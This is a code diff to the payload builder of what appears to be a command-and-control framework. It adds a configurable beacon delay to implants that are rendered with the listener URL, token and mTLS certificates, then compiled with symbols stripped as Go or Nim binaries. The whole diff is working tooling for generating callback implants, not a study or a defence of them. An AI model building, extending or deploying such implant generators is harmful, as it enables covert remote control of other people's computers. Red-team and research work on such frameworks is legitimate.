@@ -7,9 +7,10 @@
 ## ws-mtls-listener (publishes a _Profile with cert paths).
 ##
 ## Pipeline: profile -> validate cert material -> render _src/implant.<lang>
-## with {{URL}} {{TOKEN}} {{CA_PEM}} {{CLIENT_CERT_PEM}} {{CLIENT_KEY_PEM}}
-## -> compile (go build / nim c) -> 0o700 artifact in the operator's working
-## directory (never temp) -> register_payload(keep=True).
+## with {{URL}} {{TOKEN}} {{CA_PEM}} {{CLIENT_CERT_PEM}} {{CLIENT_KEY_PEM}} {{BEACON}}
+## -> compile (go build over implant.go + every sibling _src/*.go helper with
+## its build tags; nim c for the nim implant) -> 0o700 artifact in the
+## operator's working directory (never temp) -> register_payload(keep=True).
 
 import os
 import subprocess
@@ -56,6 +57,11 @@ OPTIONS = {
         "required": False,
         "desc":     "x86_64 | arm64",
     },
+    "beacon": {
+        "value":    "5",
+        "required": False,
+        "desc":     "reconnect/beacon delay in seconds (1-3600, baked in)",
+    },
 }
 
 _PROTOCOL_TAG = "ws-json-mtls"
@@ -93,7 +99,7 @@ def _artifact_target(opts):
     return os.path.join(os.getcwd(), stem + ext)
 
 
-def _render(lang, lsn):
+def _render(lang, lsn, beacon=5):
     """Read the raw implant source and bake the profile in. PEM materials
     come from the listener's published profile (paths on disk)."""
     base = os.path.dirname(os.path.abspath(__eidolon_path__))
@@ -112,7 +118,8 @@ def _render(lang, lsn):
                          ("{{CLIENT_CERT_PEM}}", crt_pem),
                          ("{{CLIENT_KEY_PEM}}", key_pem),
                          ("{{URL}}", str(lsn.url)),
-                         ("{{TOKEN}}", str(lsn.token))):
+                         ("{{TOKEN}}", str(lsn.token)),
+                         ("{{BEACON}}", str(beacon))):
         src = src.replace(token, value)
 
     if "{{" in src and "}}" in src:
@@ -154,6 +161,14 @@ def _compile(lang, src, artifact, target_os, target_arch, log):
             env["GOCACHE"] = os.path.join(work, "gocache")
             cmdline = ["go", "build", "-trimpath", "-buildvcs=false",
                        "-ldflags=-s -w", "-o", artifact, src_path]
+            assets_src = os.path.join(
+                os.path.dirname(os.path.abspath(__eidolon_path__)), "_src")
+            if os.path.isdir(assets_src):
+                for f in sorted(os.listdir(assets_src)):
+                    if f.endswith(".go") and f != "implant.go":
+                        shutil.copy2(os.path.join(assets_src, f),
+                                     os.path.join(work, f))
+                        cmdline.append(os.path.join(work, f))
             res = _probe("go", 180, cmdline, env)
         else:
             if target_arch not in _GARCH_MAP:
@@ -200,6 +215,13 @@ def run(opts):
         target_arch = "x86_64"
     if not target_os:
         target_os = _host_os()
+    try:
+        beacon = int(str(opts.get("beacon") or "").strip() or 5)
+    except ValueError:
+        return err(f"invalid beacon value: {opts.get('beacon')!r} "
+                   "— use whole seconds (1-3600)")
+    if not (1 <= beacon <= 3600):
+        return err("beacon must be 1-3600 seconds")
 
     lsn = _profile()
     if not lsn:
@@ -215,10 +237,11 @@ def run(opts):
             return err(f"listener profile lacks {attr!r} — regenerate its "
                        "cert material before building payloads")
 
-    info(f"embedding: {url} · token {str(lsn.token)[:8]}… · {getattr(lsn, 'tags', '')}")
+    info(f"embedding: {url} · token {str(lsn.token)[:8]}… · "
+         f"{getattr(lsn, 'tags', '')} · beacon {beacon}s")
 
     try:
-        src = _render(lang, lsn)
+        src = _render(lang, lsn, beacon)
     except (OSError, ValueError) as e:
         return err(f"render failed: {e}")
 
